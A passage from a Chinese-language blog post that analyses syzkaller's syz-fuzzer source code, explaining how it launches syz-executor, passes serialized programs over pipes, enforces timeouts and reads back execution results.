class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(proc *Proc)</span></span> executeRaw(opts *ipc.ExecOpts, p *prog.Prog, stat Stat) *ipc.ProgInfo &#123;<br>proc.fuzzer.checkDisabledCalls(p)<br><br><span class="hljs-comment">// 限制并发窗口，每隔一段时间进行一次泄漏检查.</span><br>ticket := proc.fuzzer.gate.Enter()<br><span class="hljs-keyword">defer</span> proc.fuzzer.gate.Leave(ticket)<br><br>proc.logProgram(opts, p)<br><span class="hljs-keyword">for</span> try := <span class="hljs-number">0</span>; ; try++ &#123;<br>atomic.AddUint64(&amp;proc.fuzzer.stats[stat], <span class="hljs-number">1</span>)<br>output, info, hanged, err := proc.env.Exec(opts, p)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> err == prog.ErrExecBufferTooSmall &#123;<br><span class="hljs-comment">// 若我们系统地在序列化程序上失败则非常糟糕,</span><br><span class="hljs-comment">// 但目前为止除了统计以外我们没有更好的处理方式.</span><br><span class="hljs-comment">// 该错误在 seeded seeded syz_mount_image 调用上观察到很多.</span><br>atomic.AddUint64(&amp;proc.fuzzer.stats[StatBufferTooSmall], <span class="hljs-number">1</span>)<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">if</span> try &gt; <span class="hljs-number">10</span> &#123;<br>log.Fatalf(<span class="hljs-string">&quot;executor %v failed %v times: %v&quot;</span>, proc.pid, try, err)<br>&#125;<br>log.Logf(<span class="hljs-number">4</span>, <span class="hljs-string">&quot;fuzzer detected executor failure=&#x27;%v&#x27;, retrying #%d&quot;</span>, err, try+<span class="hljs-number">1</span>)<br>debug.FreeOSMemory()<br>time.Sleep(time.Second)<br><span class="hljs-keyword">continue</span><br>&#125;<br>log.Logf(<span class="hljs-number">2</span>, <span class="hljs-string">&quot;result hanged=%v: %s&quot;</span>, hanged, output)<br><span class="hljs-keyword">return</span> info<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="Env-Exec-：启动-syz-executor-并将输入程序序列化后交给其执行"><a href="#Env-Exec-：启动-syz-executor-并将输入程序序列化后交给其执行" class="headerlink" title="Env.Exec()：启动 syz-executor 并将输入程序序列化后交给其执行"></a>Env.Exec()：启动 syz-executor 并将输入程序序列化后交给其执行</h4><p><code>Env.Exec()</code> 函数用来启动 syz-executor 并将输入交给其进行执行，<strong>syz-executor 在被启动后会一直等待 syz-fuzzer 传来的输入并执行</strong>，而不是每个输入都要重新启动一次 executor：</p><ul><li>首先将输入序列化到 <code>env.in</code> （作为 syz-executor 的输入，syz-executor 会反序列化后再将其执行），并将 <code>env.out</code> 的前 4 字节（<code>ncmd and nsig</code> ）置 0；这里我们注意到 syz-fuzzer 与 syz-executor 间有两种传递数据的方式：管道&#x2F;共享内存</li><li>接下来检查 executor 是否已启动，若未启动（ <code>env.cmd == nil</code> ）则调用 <code>makeCommand()</code> <strong>启动 syz-executor</strong></li><li>接下来调用 <code>cmd.exec()</code> <strong>真正开始让 syz-executor 执行程序</strong>，若出错则关闭 syz-executor（等 <code>executeRaw()</code> 的下次循环重新启动）</li><li>最后解析程序输出，返回结果</li></ul><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Exec 启动 executor 二进制文件以执行程序 p 并返回关于执行的信息:</span><br><span class="hljs-comment">// output: 程序输出</span><br><span class="hljs-comment">// info: per-call info</span><br><span class="hljs-comment">// hanged: 程序挂起且被杀死</span><br><span class="hljs-comment">// err0: 启动程序失败或是 executor 自身有问题.</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(env *Env)</span></span> Exec(opts *ExecOpts, p *prog.Prog) (output []<span class="hljs-type">byte</span>, info *ProgInfo, hanged <span class="hljs-type">bool</span>, err0 <span class="hljs-type">error</span>) &#123;<br><span class="hljs-comment">// Copy-in serialized program.</span><br>progSize, err := p.SerializeForExec(env.in)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>err0 = err<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">var</span> progData []<span class="hljs-type">byte</span><br><span class="hljs-keyword">if</span> !env.config.UseShmem &#123;<br>progData = env.in[:progSize]<br>&#125;<br><span class="hljs-comment">// 清零前两个字 (ncmd and nsig), 由此若 executor 在写入非垃圾数据前崩溃，</span><br><span class="hljs-comment">// 我们在这里便没有垃圾.</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">4</span>; i++ &#123;<br>env.out[i] = <span class="hljs-number">0</span><br>&#125;<br><br>atomic.AddUint64(&amp;env.StatExecs, <span class="hljs-number">1</span>)<br><span class="hljs-keyword">if</span> env.cmd == <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">/* syz-executor 未启动 */</span><br><span class="hljs-keyword">if</span> p.Target.OS != targets.TestOS &amp;&amp; targets.Get(p.Target.OS, p.Target.Arch).HostFuzzer &#123;<br><span class="hljs-comment">// executor 实际上是 ssh,</span><br><span class="hljs-comment">// 太频繁地启动他们会导致延迟.</span><br>&lt;-rateLimit.C<br>&#125;<br>tmpDirPath := <span class="hljs-string">&quot;./&quot;</span><br>atomic.AddUint64(&amp;env.StatRestarts, <span class="hljs-number">1</span>)<br>env.cmd, err0 = makeCommand(env.pid, env.bin, env.config, env.inFile, env.outFile, env.out, tmpDirPath)<br><span class="hljs-keyword">if</span> err0 != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>output, hanged, err0 = env.cmd.exec(opts, progData)<span class="hljs-comment">/* 执行输入 */</span><br><span class="hljs-keyword">if</span> err0 != <span class="hljs-literal">nil</span> &#123; <span class="hljs-comment">/* 出错，关闭 executor */</span><br>env.cmd.<span class="hljs-built_in">close</span>()<br>env.cmd = <span class="hljs-literal">nil</span><br><span class="hljs-keyword">return</span><br>&#125;<br><br>info, err0 = env.parseOutput(p, opts)<br><span class="hljs-keyword">if</span> info != <span class="hljs-literal">nil</span> &amp;&amp; env.config.Flags&amp;FlagSignal == <span class="hljs-number">0</span> &#123;<br>addFallbackSignal(p, info)<br>&#125;<br><span class="hljs-keyword">if</span> !env.config.UseForkServer &#123;<br>env.cmd.<span class="hljs-built_in">close</span>()<br>env.cmd = <span class="hljs-literal">nil</span><br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="【核心】makeCommand-：建立通信管道，启动-syz-executor"><a href="#【核心】makeCommand-：建立通信管道，启动-syz-executor" class="headerlink" title="【核心】makeCommand()：建立通信管道，启动 syz-executor"></a>【核心】makeCommand()：建立通信管道，启动 syz-executor</h4><p><code>makeCommand()</code> 函数是真正启动 syz-executor 的函数，其首先会先创建一个临时文件夹 <code>syzkaller-testdir</code> 并更改权限为 <code>0777</code>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">makeCommand</span><span class="hljs-params">(pid <span class="hljs-type">int</span>, bin []<span class="hljs-type">string</span>, config *Config, inFile, outFile *os.File, outmem []<span class="hljs-type">byte</span>,</span></span><br><span class="hljs-params"><span class="hljs-function">tmpDirPath <span class="hljs-type">string</span>)</span></span> (*command, <span class="hljs-type">error</span>) &#123;<br>dir, err := os.MkdirTemp(tmpDirPath, <span class="hljs-string">&quot;syzkaller-testdir&quot;</span>)<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create temp dir: %v&quot;</span>, err)<br>&#125;<br>dir = osutil.Abs(dir)<br><br>timeout := config.Timeouts.Program<br><span class="hljs-keyword">if</span> config.UseForkServer &#123;<br><span class="hljs-comment">// 在启用了 fork server 时，Executor 有一个内部的 timeout，可以防止大部分的挂起，</span><br><span class="hljs-comment">// 因此我们用一个非常大的 timeout. Executor 可以因为命名空间中的全局锁与其他东西而变慢，</span><br><span class="hljs-comment">// 故我们最好等待，而非上报虚假的误导性 crashes.</span><br>timeout *= <span class="hljs-number">10</span><br>&#125;<br><br>c := &amp;command&#123;<br>pid:     pid,<br>config:  config,<br>timeout: timeout,<br>dir:     dir,<br>outmem:  outmem,<br>&#125;<br><span class="hljs-keyword">defer</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-keyword">if</span> c != <span class="hljs-literal">nil</span> &#123;<br>c.<span class="hljs-built_in">close</span>()<br>&#125;<br>&#125;()<br><br><span class="hljs-keyword">if</span> err := os.Chmod(dir, <span class="hljs-number">0777</span>); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to chmod temp dir: %v&quot;</span>, err)<br>&#125;<br></code></pre></td></tr></table></figure><p>接下来创建三个用以与 <code>syz-executor</code> 通信的管道，分别用于捕获输出、向 executor 传递命令、从 executor 接收命令：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// Output 捕获管道.</span><br>rp, wp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> wp.Close()<br><br><span class="hljs-comment">// executor-&gt;ipc 命令管道.</span><br>inrp, inwp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> inwp.Close()<br>c.inrp = inrp<br><br><span class="hljs-comment">// ipc-&gt;executor 命令管道.</span><br>outrp, outwp, err := os.Pipe()<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to create pipe: %v&quot;</span>, err)<br>&#125;<br><span class="hljs-keyword">defer</span> outrp.Close()<br>c.outwp = outwp<br><br>c.readDone = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> []<span class="hljs-type">byte</span>, <span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>接下来会调用 <code>osutil</code> 中的 <code>Command()</code> 创建一个 <code>exec.Cmd</code> 实例（该函数为 golag 原生的 <code>exec.Command()</code> 的 wrapper），executor 实际上要等到后面显式调用 <code>Start()</code> 或 <code>Run()</code> 才正式开始运行（参见<a href="https://books.studygolang.com/The-Golang-Standard-Library-by-Example/chapter10/10.1.html">创建进程 · Go语言标准库</a>）：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs go">cmd := osutil.Command(bin[<span class="hljs-number">0</span>], bin[<span class="hljs-number">1</span>:]...)<br><span class="hljs-keyword">if</span> inFile != <span class="hljs-literal">nil</span> &amp;&amp; outFile != <span class="hljs-literal">nil</span> &#123;<br>cmd.ExtraFiles = []*os.File&#123;inFile, outFile&#125;<br>&#125;<br>cmd.Dir = dir<br><span class="hljs-comment">// Tell ASAN to not mess with our NONFAILING.</span><br>cmd.Env = <span class="hljs-built_in">append</span>(<span class="hljs-built_in">append</span>([]<span class="hljs-type">string</span>&#123;&#125;, os.Environ()...), <span class="hljs-string">&quot;ASAN_OPTIONS=handle_segv=0 allow_user_segv_handler=1&quot;</span>)<br>cmd.Stdin = outrp<br>cmd.Stdout = inwp<br></code></pre></td></tr></table></figure><p>若是未设置 <code>FlagDebug</code> 则还会启动一个新的协程持续读取 syz-executor 输出管道中的内容：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> config.Flags&amp;FlagDebug != <span class="hljs-number">0</span> &#123;<br><span class="hljs-built_in">close</span>(c.readDone)<br>cmd.Stderr = os.Stdout<br>&#125; <span class="hljs-keyword">else</span> &#123;<br>cmd.Stderr = wp<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *command)</span></span> &#123;<br><span class="hljs-comment">// 读出输出以防 executor 持续地打印一些东西。</span><br><span class="hljs-keyword">const</span> bufSize = <span class="hljs-number">128</span> &lt;&lt; <span class="hljs-number">10</span><br>output := <span class="hljs-built_in">make</span>([]<span class="hljs-type">byte</span>, bufSize)<br><span class="hljs-keyword">var</span> size <span class="hljs-type">uint64</span><br><span class="hljs-keyword">for</span> &#123;<br>n, err := rp.Read(output[size:])<br><span class="hljs-keyword">if</span> n &gt; <span class="hljs-number">0</span> &#123;<br>size += <span class="hljs-type">uint64</span>(n)<br><span class="hljs-keyword">if</span> size &gt;= bufSize*<span class="hljs-number">3</span>/<span class="hljs-number">4</span> &#123;<br><span class="hljs-built_in">copy</span>(output, output[size-bufSize/<span class="hljs-number">2</span>:size])<br>size = bufSize / <span class="hljs-number">2</span><br>&#125;<br>&#125;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>rp.Close()<br>c.readDone &lt;- output[:size]<br><span class="hljs-built_in">close</span>(c.readDone)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br>&#125;(c)<br>&#125;<br></code></pre></td></tr></table></figure><p>最后调用 <code>cmd.Start()</code> 真正启动 syz-executor（该方法不会阻塞父进程），并启动一个新的协程等待 syz-executor 的退出：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">if</span> err := cmd.Start(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, fmt.Errorf(<span class="hljs-string">&quot;failed to start executor binary: %v&quot;</span>, err)<br>&#125;<br>c.exited = <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">error</span>, <span class="hljs-number">1</span>)<br>c.cmd = cmd<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *command)</span></span> &#123;<br>err := c.cmd.Wait()<br>c.exited &lt;- err<br><span class="hljs-built_in">close</span>(c.exited)<br><span class="hljs-comment">// 若 cmd.Stderr 已被泄露给另一个活动进程，防止 livelock.</span><br>rp.SetDeadline(time.Now().Add(<span class="hljs-number">5</span> * time.Second))<br>&#125;(c)<br>wp.Close()<br><span class="hljs-comment">// 注意: 尽管我们在上面 defer 了，我们在调用🤝前明确地关闭 inwp.</span><br><span class="hljs-comment">// 若我们不这么做且 executor 在写入🤝答复前退出了,</span><br><span class="hljs-comment">// 由于我们持有另一个打开的管道末端，从 inrp 上读取将挂起.</span><br>inwp.Close()<br><br><span class="hljs-keyword">if</span> c.config.UseForkServer &#123;<br><span class="hljs-keyword">if</span> err := c.handshake(); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span>, err<br>&#125;<br>&#125;<br>tmp := c<br>c = <span class="hljs-literal">nil</span> <span class="hljs-comment">// disable defer above</span><br><span class="hljs-keyword">return</span> tmp, <span class="hljs-literal">nil</span><br>&#125;<br></code></pre></td></tr></table></figure><h4 id="【核心】cmd-exec-：将单个程序输入传递给-syz-executor-执行"><a href="#【核心】cmd-exec-：将单个程序输入传递给-syz-executor-执行" class="headerlink" title="【核心】cmd.exec()：将单个程序输入传递给 syz-executor 执行"></a>【核心】cmd.exec()：将单个程序输入传递给 syz-executor 执行</h4><p><code>command.exec()</code> 函数用以将一个序列化后的输入传递给 syz-executor 进程执行，传递的方式主要是通过在 <code>makeCommand()</code> 中建立的 <code>ipc→executor</code> 管道完成的：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-params">(c *command)</span></span> exec(opts *ExecOpts, progData []<span class="hljs-type">byte</span>) (output []<span class="hljs-type">byte</span>, hanged <span class="hljs-type">bool</span>, err0 <span class="hljs-type">error</span>) &#123;<br>req := &amp;executeReq&#123;<br>magic:            inMagic,<br>envFlags:         <span class="hljs-type">uint64</span>(c.config.Flags),<br>execFlags:        <span class="hljs-type">uint64</span>(opts.Flags),<br>pid:              <span class="hljs-type">uint64</span>(c.pid),<br>syscallTimeoutMS: <span class="hljs-type">uint64</span>(c.config.Timeouts.Syscall / time.Millisecond),<br>programTimeoutMS: <span class="hljs-type">uint64</span>(c.config.Timeouts.Program / time.Millisecond),<br>slowdownScale:    <span class="hljs-type">uint64</span>(c.config.Timeouts.Scale),<br>progSize:         <span class="hljs-type">uint64</span>(<span class="hljs-built_in">len</span>(progData)),<br>&#125;<br>reqData := (*[unsafe.Sizeof(*req)]<span class="hljs-type">byte</span>)(unsafe.Pointer(req))[:]<br><span class="hljs-keyword">if</span> _, err := c.outwp.Write(reqData); err != <span class="hljs-literal">nil</span> &#123;<br>output = &lt;-c.readDone<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: failed to write control pipe: %v&quot;</span>, c.pid, err)<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> progData != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">if</span> _, err := c.outwp.Write(progData); err != <span class="hljs-literal">nil</span> &#123;<br>output = &lt;-c.readDone<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: failed to write control pipe: %v&quot;</span>, c.pid, err)<br><span class="hljs-keyword">return</span><br>&#125;<br>&#125;<br><span class="hljs-comment">// 在这个点程序已经开始运行了.</span><br></code></pre></td></tr></table></figure><p>对于单个输入程序的传输实际上会先传递一个 <code>executeReq</code> 头部，接下来再传递序列化后的输入程序：</p><p><img src="https://s2.loli.net/2023/04/24/I6od1evyCE3MZWH.png" alt="image.png"></p><p>当数据传递过去之后<strong>输入程序就已经开始执行了</strong>，因此该函数后面的部分就都是对结果的处理；）</p><p>完成数据发送后会启动一个协程定时等待 executor 执行完毕，若超时则会将 executor 给 kill 掉：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs go">done := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br>hang := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">bool</span>)<br><span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>t := time.NewTimer(c.timeout)<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-keyword">case</span> &lt;-t.C:<br>c.cmd.Process.Kill()<br>hang &lt;- <span class="hljs-literal">true</span><br><span class="hljs-keyword">case</span> &lt;-done:<br>t.Stop()<br>hang &lt;- <span class="hljs-literal">false</span><br>&#125;<br>&#125;()<br></code></pre></td></tr></table></figure><p>随后是一个无限大循环，从 <code>executor→ipc</code> 管道中读取 syz-executor 的执行结果，同样是一个 header <code>executeReply</code> 带一份数据 <code>callReply</code> ，单次请求可能有多份返回数据因此这里是一个无限循环，通过 <code>executeReply</code> 中的 <code>done</code> 标志位标识结束：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs go">exitStatus := <span class="hljs-number">-1</span><br>completedCalls := (*<span class="hljs-type">uint32</span>)(unsafe.Pointer(&amp;c.outmem[<span class="hljs-number">0</span>]))<br>outmem := c.outmem[<span class="hljs-number">4</span>:]<br><span class="hljs-keyword">for</span> &#123;<br>reply := &amp;executeReply&#123;&#125;<br>replyData := (*[unsafe.Sizeof(*reply)]<span class="hljs-type">byte</span>)(unsafe.Pointer(reply))[:]<br><span class="hljs-keyword">if</span> _, err := io.ReadFull(c.inrp, replyData); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> reply.magic != outMagic &#123;<br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;executor %v: got bad reply magic 0x%x\n&quot;</span>, c.pid, reply.magic)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-keyword">if</span> reply.done != <span class="hljs-number">0</span> &#123;<br>exitStatus = <span class="hljs-type">int</span>(reply.status)<br><span class="hljs-keyword">break</span><br>&#125;<br>callReply := &amp;callReply&#123;&#125;<br>callReplyData := (*[unsafe.Sizeof(*callReply)]<span class="hljs-type">byte</span>)(unsafe.Pointer(callReply))[:]<br><span class="hljs-keyword">if</span> _, err := io.ReadFull(c.inrp, callReplyData); err != <span class="hljs-literal">nil</span> &#123;<br><span class="hljs-keyword">break</span><br>&#125;<br><span class="hljs-keyword">if</span> callReply.signalSize != <span class="hljs-number">0</span> || callReply.coverSize != <span class="hljs-number">0</span> || callReply.compsSize != <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// 暂不支持.</span><br>fmt.Fprintf(os.Stderr, <span class="hljs-string">&quot;executor %v: got call reply with coverage\n&quot;</span>, c.pid)<br>os.Exit(<span class="hljs-number">1</span>)<br>&#125;<br><span class="hljs-built_in">copy</span>(outmem, callReplyData)<br>outmem = outmem[<span class="hljs-built_in">len</span>(callReplyData):]<br>*completedCalls++<br>&#125;<br></code></pre></td></tr></table></figure><p>syz-fuzzer 接收 syz-executor 返回数据的示例如下图所示：</p><p><img src="https://s2.loli.net/2023/04/24/seE43rD2uaXCbwj.png" alt="image.png"></p><p>最后检查本次执行结果，如果说执行结果一切顺利则直接返回，<strong>否则会终止 syz-executor 的继续运行</strong>：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-built_in">close</span>(done)<br><span class="hljs-keyword">if</span> exitStatus == <span class="hljs-number">0</span> &#123;<br><span class="hljs-comment">// Program was OK.</span><br>&lt;-hang<br><span class="hljs-keyword">return</span><br>&#125;<br>c.cmd.Process.Kill()<br>output = &lt;-c.readDone<br><span class="hljs-keyword">if</span> err := c.wait(); &lt;-hang &#123;<br>hanged = <span class="hljs-literal">true</span><br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>output = <span class="hljs-built_in">append</span>(output, err.Error()...)<br>output = <span class="hljs-built_in">append</span>(output, <span class="hljs-string">&#x27;\n&#x27;</span>)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><span class="hljs-keyword">if</span> exitStatus == <span class="hljs-number">-1</span> &#123;<br>exitStatus = osutil.ProcessExitStatus(c.cmd.ProcessState)<br>&#125;<br><span class="hljs-comment">// 忽略其他的所有错误.</span><br><span class="hljs-comment">// 在没有 fork server 的情况下 executor 可以合法地退出 (program contains exit_group),</span><br><span class="hljs-comment">// 在带有 fork server 的情况下若 top process 想要特殊的处理，则其可以带着 statusFail 退出.</span><br><span class="hljs-keyword">if</span> exitStatus == statusFail &#123;<br>err0 = fmt.Errorf(<span class="hljs-string">&quot;executor %v: exit status %d\n%s&quot;</span>, c.pid, exitStatus, output)<br>&#125;<br><span class="hljs-keyword">return</span><br>&#125;<br><br></code></pre></td></tr></table></figure><h3 id="③-proc-smashInput-：执行并变异刚刚被加入到语料库中的程序【核心】"><a href="#③-proc-smashInput-：执行并变异刚刚被加入到语料库中的程序【核心】" class="headerlink" title="③ 